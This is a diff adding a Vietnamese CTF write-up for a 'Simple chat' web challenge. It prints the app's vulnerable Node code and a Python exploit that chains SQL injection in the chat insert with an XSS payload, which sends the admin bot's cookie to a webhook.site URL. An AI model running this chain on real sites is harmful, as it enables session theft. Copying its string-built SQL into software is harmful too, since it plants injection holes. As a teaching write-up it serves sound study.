@@ -315,3 +315,581 @@ PolentaGPT:
         app.run(host="127.0.0.1", port=1337, debug=True)
     
     xong có nonce thì cứ inject xss như thường thôi để lấy cookie=securetoken => tạo cookie ở trong web app.py để lấy Flag 
+
+
+____________________________________________________________________________________________________________________________________________________________________
+
+Simple chat:
+    
+(*) app.js :
+        import express from 'express';
+import session from 'express-session';
+import bodyParser from 'body-parser';
+import { PostgresClient } from "./db.js";
+const app = express()
+const port = 3000
+
+const FRIENDS = ['Val','augusto','CubikMan47','LolLo','Hiipso','FTW'];
+const CHALLENGE_HOST = process.env.CHALLENGE_HOST || 'http://challenge:3000'
+const HEADLESS_HOST = process.env.HEADLESS_HOST || 'headless:5000';
+const HEADLESS_AUTH = process.env.HEADLESS_AUTH || 'supersecret';
+const FLAG = process.env.FLAG || 'corn{redacted}';
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'supersecret';
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+await sleep(1000);
+const db = new PostgresClient();
+const connection = await db.connect();
+if(connection == 0){
+  console.log("Connected!");
+}
+await db.init();
+
+app.set("view engine", "ejs");
+app.set('views', '/app' + '/templates');
+app.use(bodyParser.json())
+app.use('/static',express.static('static'));
+app.use(session({
+  secret: process.env.SECRET || 'SuperSecret',
+  resave: false,
+  saveUninitialized: false,
+}))
+
+app.get('/', (req, res) => {
+  if(!req.session.username){
+    res.redirect('/login');
+    return;
+  }
+  res.render(`index`);
+})
+
+app.get('/login', (req,res) => {
+  res.render('login');
+})
+
+app.get('/register', (req,res) => {
+  res.render('register');
+})
+
+app.post('/api/v1/login',async (req,res) => {
+  const username = req.body.username;
+  const password = req.body.password;
+  if(typeof username !== 'string' || typeof password !== 'string' || username == '' || password == ''){
+    res.json({'status':'bad credentials'})
+    return
+  }
+  const isLoggedIn = await db.login(username,password);
+  if(!isLoggedIn){
+    res.json({'status':'wrong credentials'})
+    return
+  }
+  const response = {'status':'you are logged in!'}
+  req.session.username = username
+  res.json(response)
+})
+
+app.get('/api/v1/profile',async (req,res) => {
+  if(!req.session.username){
+    res.json({'status':'You are not logged in.'})
+    return;
+  }
+  res.json({'status':'success','profile':req.session.username})
+})
+
+app.get('/api/v1/fetchMessages',async (req,res) => {
+  if(!req.session.username){
+    res.json({'status':'You are not logged in.'})
+    return;
+  }
+  const friend = req.query.friend;
+  if(!FRIENDS.includes(friend)) {
+    res.json({'status':"this guy doesn't exist lmaoooo"})
+    return;
+  }
+  const result = await db.fetchMessages(req.session.username,friend);
+  res.json({'status':'success','messages':result})
+})
+
+app.post('/api/v1/insertChat',async (req,res) => {
+  const sender = req.body.sender;
+  const receiver = req.body.receiver;
+  var message = req.body.message;
+
+  if(!FRIENDS.includes(sender) && sender !== 'admin' && sender !== 'kekw'){
+    res.json({'status':"you can't write messages on behalf of other people."})
+    return
+  }
+
+  if(!FRIENDS.includes(receiver) && receiver !== 'admin' && receiver !== 'kekw') {
+    res.json({'status':"you can't write to nobody"})
+    return;
+  }
+
+  //no XSS
+  message = message.replaceAll('<','&lt;');
+  message = message.replaceAll('>','&gt;');
+
+  const result = await db.insertChat(sender,receiver,message);
+  if(result != 0){
+    res.json({'status':"Couldn't insert the chat."});
+    return;
+  }
+  const response = {'status':'Success'};
+  res.json(response);
+})
+
+app.get('/ping', async (req,res) => {
+  const friend = req.query.friend;
+  if(!req.session.username){
+    res.json({'status':"You have to be logged in to ping admin"});
+    return;
+  }
+  // khi ma
+  if(!FRIENDS.includes(friend)){
+    res.json({'status':"You are not admin's friend"});
+    return;
+  }
+  fetch(`${HEADLESS_HOST}/`, { 
+    method: 'POST', 
+    headers: { 'Content-Type': 'application/json', 'X-Auth': HEADLESS_AUTH },
+    body: JSON.stringify({
+        browser: 'chrome',
+        actions: [
+            {
+                type: 'request',
+                url: `${CHALLENGE_HOST}/`,
+            },
+            {
+                type: 'set-cookie',
+                name: 'flag',
+                value: FLAG
+            },
+            {
+                type: 'sleep',
+                time: 2
+            },
+            {
+                type: 'type',
+                element: 'input#username', //username
+                value: 'admin'
+            },
+            {
+                type: 'type',
+                element: 'input#password', //password
+                value: ADMIN_PASSWORD
+            },
+            {
+                type: 'sleep',
+                time: 1
+            },            
+            {
+                type: 'click',
+                element: 'input[type=submit]'
+            },
+            {
+                type: 'sleep',
+                time: 5
+            },
+            {
+                type: 'click',
+                element: `#friend-list > li:nth-child(${FRIENDS.indexOf(friend)+1})` //opens chat with said friend
+            },
+            {
+                type: 'sleep',
+                time: 10
+            },
+        ]
+     })}).then(r => {
+      console.log(r.status_code)
+     })
+    
+  res.json({'status':'Admin got pinged'})
+})
+
+app.listen(port, () => {
+  console.log(`Challenge listening on port ${port}`)
+})
+
+(*)db.js:
+
+import pg from 'pg'
+const { Client } = pg
+import crypto from 'crypto';
+const POSTGRES_USER = process.env.POSTGRES_USER || 'postgres';
+const POSTGRES_PASSWORD=process.env.POSTGRES_PASSWORD || 'password';
+const POSTGRES_HOST=process.env.POSTGRES_HOST || 'db';
+const POSTGRES_DB=process.env.POSTGRES_DB || 'postgres';
+const ADMIN_PASSWORD=process.env.ADMIN_PASSWORD || 'supersecret';
+
+
+export class PostgresClient {
+    client;
+    constructor(){
+        this.client = new Client({
+            user: POSTGRES_USER,
+            host: POSTGRES_HOST,
+            database: POSTGRES_DB,
+            password: POSTGRES_PASSWORD,
+            port: 5432,
+          });
+    }
+
+    async connect() {
+        await this.client.connect(function (err) {
+            if (err) {
+                throw err;
+            }
+        });
+        return 0;
+    }
+
+    async close() {
+        await this.client.end();
+        return 0;
+    }
+
+    async init(){
+        const query = `
+                    DROP TABLE IF EXISTS chat;
+                    DROP TABLE IF EXISTS users;
+                    CREATE TABLE users(
+                        username varchar(20) PRIMARY KEY NOT NULL,
+                        password varchar(32) NOT NULL
+                    );
+                    INSERT INTO users(username,password) VALUES 
+                        ('admin','${ADMIN_PASSWORD}'),
+                        ('Val','${crypto.randomBytes(16).toString("hex")}'),
+                        ('augusto','${crypto.randomBytes(16).toString("hex")}'),
+                        ('CubikMan47','${crypto.randomBytes(16).toString("hex")}'),
+                        ('LolLo','${crypto.randomBytes(16).toString("hex")}'),
+                        ('Hiipso','${crypto.randomBytes(16).toString("hex")}'),
+                        ('FTW','${crypto.randomBytes(16).toString("hex")}'),
+                        ('kekw','kekw');
+                    CREATE TABLE chat(
+                        sender varchar(20) NOT NULL,
+                        receiver varchar(20) NOT NULL,
+                        message varchar(120) NOT NULL,
+                        timestamp TIMESTAMP WITH TIME ZONE DEFAULT now(),
+                        PRIMARY KEY (sender,receiver,message,timestamp),
+                        FOREIGN KEY (sender) REFERENCES users(username),
+                        FOREIGN KEY (receiver) REFERENCES users(username)
+                    );
+                    INSERT INTO chat(sender,receiver,message) VALUES
+                    ('admin','Val','wym'),
+                    ('Val','admin','kekw'),
+                    ('Val','kekw','yoooo'),
+                    ('Hiipso','kekw','U.U'),
+                    ('FTW','kekw','OwO'),
+                    ('CubikMan47','kekw','mhanz'),
+                    ('LolLo','kekw','mhanz'),
+                    ('augusto','kekw','Where flag');`;
+        await this.client.query(query);
+        return 0;
+    }
+
+    async login(username,password){
+        try{
+            const query = `SELECT * 
+                           FROM users
+                           WHERE username=$1 AND password=$2`;
+            const parameters = [username,password];
+            const result = await this.client.query(query,parameters);
+            if(result.rowCount > 0){
+                return true;
+            }
+            return false;
+        } catch (e) {
+            console.log(`Error: ${e}`);
+            return false;
+        }
+    }
+
+    async insertChat(sender,receiver,message){
+        try{
+            const query = `INSERT INTO chat(sender,receiver,message) VALUES ('${sender}','${receiver}','${message}');`;
+            await this.client.query(query);
+        } catch (e) {
+            console.log(`Error: ${e}`)
+            return 1;
+        }
+        return 0;
+    }
+
+    async fetchMessages(friend1,friend2){
+        try{
+            const query = `SELECT *
+                       FROM chat 
+                       WHERE sender='${friend1}' AND receiver='${friend2}'
+                       UNION SELECT *
+                       FROM chat
+                       WHERE sender='${friend2}' AND receiver='${friend1}'
+                       ORDER BY timestamp;`;
+            const result = await this.client.query(query);
+            return result.rows;
+        } catch (e) {
+            console.log(`Error: ${e}`)
+            return [];
+        }
+    }
+}
+
+(*)script.js
+const msgerForm = get(".msger-inputarea");
+const msgerInput = get(".msger-input");
+const msgerChat = get(".msger-chat");
+
+const BOT_MSGS = [
+  "Hi, how are you?",
+  "Where flag",
+  "Skill issue",
+  "ziomela...",
+  "I feel sleepy! :("
+];
+
+
+
+// Icons made by Freepik from www.flaticon.com
+var BOT_NAME = document.getElementsByClassName("friend")[0].outerText;
+var BOT_IMG = '/static/img/'+BOT_NAME+'.png';
+const PERSON_IMG = "/static/img/kekw.jpg";
+var PERSON_NAME = "";
+fetchProfile().then(data => PERSON_NAME = data['profile']);
+//fetchMessages(BOT_NAME);
+
+
+const friends = [...document.getElementsByClassName("friend")];
+friends.forEach(addClickListener);
+
+function addClickListener(friend){
+  friend.addEventListener("click", async event => {
+    event.preventDefault();
+
+    friends.forEach(unselect);
+    BOT_NAME = friend.outerText;
+    BOT_IMG = '/static/img/'+BOT_NAME+'.png';
+    friend.className = 'friend selected';
+    removeMessages();
+    fetchMessages(BOT_NAME);
+  })
+}
+
+function unselect(friend){
+  friend.className = 'friend'
+}
+
+msgerForm.addEventListener("submit", async event => {
+  event.preventDefault();
+
+  const msgText = msgerInput.value;
+  if (!msgText) return;
+
+  const friend = document.getElementsByClassName("friend selected")[0].outerText;
+
+  appendMessage(PERSON_NAME, PERSON_IMG, "right", msgText);
+  msgerInput.value = "";
+
+  await insertChat(PERSON_NAME,friend,msgText)
+  botResponse();
+});
+
+function appendMessage(name, img, side, text) {
+  //   Simple solution for small apps
+  const msgHTML = `
+    <div class="msg ${side}-msg">
+      <div class="msg-img" style="background-image: url(${img})"></div>
+
+      <div class="msg-bubble">
+        <div class="msg-info">
+          <div class="msg-info-name">${name}</div>
+        </div>
+
+        <div class="msg-text">${text}</div>
+      </div>
+    </div>
+  `;
+
+  msgerChat.insertAdjacentHTML("beforeend", msgHTML);
+  msgerChat.scrollTop += 500;
+}
+
+async function fetchProfile() {
+  const response = await fetch('/api/v1/profile',{
+    method: 'GET',
+  });
+  const json = await response.json();
+  return json;
+}
+
+async function fetchMessages(friend){
+  const response = await fetch('/api/v1/fetchMessages?friend='+friend,{
+    method: 'GET',
+  });
+  const json = await response.json();
+  for(let i in json['messages']){
+    if(json['messages'][i]['sender']==friend){
+      appendMessage(friend, BOT_IMG, "left", json['messages'][i]['message']);
+    } else {
+      appendMessage(PERSON_NAME, PERSON_IMG, "right", json['messages'][i]['message']);
+    }
+  }
+}
+
+function removeMessages(){
+  var toRemove = [...document.getElementsByClassName("msg")];
+  for(const msg of toRemove){
+    msg.remove();
+  }
+}
+
+function botResponse() {
+  const r = random(0, BOT_MSGS.length - 1);
+  const msgText = BOT_MSGS[r];
+  const delay = msgText.split(" ").length * 100;
+  setTimeout(async () => {
+    appendMessage(BOT_NAME, BOT_IMG, "left", msgText);
+    await insertChat(BOT_NAME,PERSON_NAME,msgText);
+  },delay);
+}
+
+async function insertChat(sender,receiver,message) {
+  await fetch('/api/v1/insertChat',{
+    method: 'POST',
+    headers: {
+      'Content-Type':'application/json; charset=utf-8'
+    },
+    body: JSON.stringify({'sender':sender,'receiver':receiver,'message':message})
+  });
+}
+
+// Utils
+function get(selector, root = document) {
+  return root.querySelector(selector);
+}
+
+function formatDate(date) {
+  const h = "0" + date.getHours();
+  const m = "0" + date.getMinutes();
+
+  return `${h.slice(-2)}:${m.slice(-2)}`;
+}
+
+function random(min, max) {
+  return Math.floor(Math.random() * (max - min) + min);
+}
+
+Tổng kết lại là chúng ta có 1 cái web chat như messenger với mn 
+(nhưng mà khi login thì phải dùng acc kekw:kekw thì mới có thể vào)
+                    INSERT INTO users(username,password) VALUES 
+                        ('admin','${ADMIN_PASSWORD}'),
+                        ('Val','${crypto.randomBytes(16).toString("hex")}'),
+                        ('augusto','${crypto.randomBytes(16).toString("hex")}'),
+                        ('CubikMan47','${crypto.randomBytes(16).toString("hex")}'),
+                        ('LolLo','${crypto.randomBytes(16).toString("hex")}'),
+                        ('Hiipso','${crypto.randomBytes(16).toString("hex")}'),
+                        ('FTW','${crypto.randomBytes(16).toString("hex")}'),
+                        ('kekw','kekw');
+
+khi vào trang chủ , chúng ta có thể chat với các con bot 1 cách vô nghĩa kkk:
+
+                    INSERT INTO chat(sender,receiver,message) VALUES
+                    ('admin','Val','wym'),
+                    ('Val','admin','kekw'),
+                    ('Val','kekw','yoooo'),
+                    ('Hiipso','kekw','U.U'),
+                    ('FTW','kekw','OwO'),
+                    ('CubikMan47','kekw','mhanz'),
+                    ('LolLo','kekw','mhanz'),
+                    ('augusto','kekw','Where flag');`;
+
+tuy vậy , chúng ta có thể sử dụng /ping?friend=ten_friend để ép admin mở + đọc chat của ten-friend và admin (chính là bot)  
+
+còn nữa , app dính sql injection (vì không có filter sql gì cả) và xss (data từ database đến clent không filter gì cả)
+
+    async insertChat(sender,receiver,message){
+        try{
+            const query = `INSERT INTO chat(sender,receiver,message) VALUES ('${sender}','${receiver}','${message}');`;
+            await this.client.query(query);
+        } catch (e) {
+            console.log(`Error: ${e}`)
+            return 1;
+        }
+        return 0;
+    }
+
+app.post('/api/v1/insertChat',async (req,res) => {
+  const sender = req.body.sender;
+  const receiver = req.body.receiver;
+  var message = req.body.message;
+
+  if(!FRIENDS.includes(sender) && sender !== 'admin' && sender !== 'kekw'){
+    res.json({'status':"you can't write messages on behalf of other people."})
+    return
+  }
+
+  if(!FRIENDS.includes(receiver) && receiver !== 'admin' && receiver !== 'kekw') {
+    res.json({'status':"you can't write to nobody"})
+    return;
+  }
+
+  //no XSS
+  message = message.replaceAll('<','&lt;');
+  message = message.replaceAll('>','&gt;');
+
+  const result = await db.insertChat(sender,receiver,message);
+  if(result != 0){
+    res.json({'status':"Couldn't insert the chat."});
+    return;
+  }
+  const response = {'status':'Success'};
+  res.json(response);
+})
+
+tuy vậy , chúng ta không thể trực tiếp gửi xss cho bot/admin vì không phải bạn:
+  if(!req.session.username){
+    res.json({'status':"You have to be logged in to ping admin"});
+    return;
+  }
+  // khi ma
+  if(!FRIENDS.includes(friend)){
+    res.json({'status':"You are not admin's friend"});
+    return;
+  }
+
+vì vậy ta có thể kết hợp sql injection để thực thi xss bằng cách nhét payload xss trong payload sql (đc encode để né filter xss đầu vào) ,nhét payload đó vào 1 
+ng bất kì để thực thi sql injection vào database để inject xss vào đoạn chat của ng đó và admin để rồi sử dụng tính năng /ping để gọi bot vào xem đoạn chat đó
+để thực thi xss lấy cookie chứa flag của bot's brower 
+
+payloads:
+    import requests
+import base64
+import time
+import os
+
+token_id = "00000000-0000-0000-0000-000000000000"
+
+XSS = f'<img src=x onerror="location=`https://webhook.site/{token_id}?`+document.cookie"></img>'
+
+SQLI = f"//kekw'),('augusto','admin',convert_from(decode('{base64.b64encode(XSS.encode()).decode()}', 'base64'),'utf-8'))-- -"
+
+print(SQLI)
+
+s = requests.Session()
+
+URL = os.getenv("HOST", "http://localhost")
+
+s.post(URL+"/api/v1/login",json={'username':'kekw','password':'kekw'})
+
+s.post(URL+"/api/v1/insertChat",json={'sender':'kekw','receiver':'augusto','message':f'{SQLI}'})
+
+response = s.get(URL+"/ping?friend=augusto")
+
+print(response.json())
+
+time.sleep(20)
+
+response = requests.get('https://webhook.site/token/'+ token_id +'/requests')
+
+if 'corn' in response.json()['data'][0]['url']:
+    print(response.json()['data'][0]['url'].split("?flag=")[1])
+
+và chúng ta có thể lấy flag 
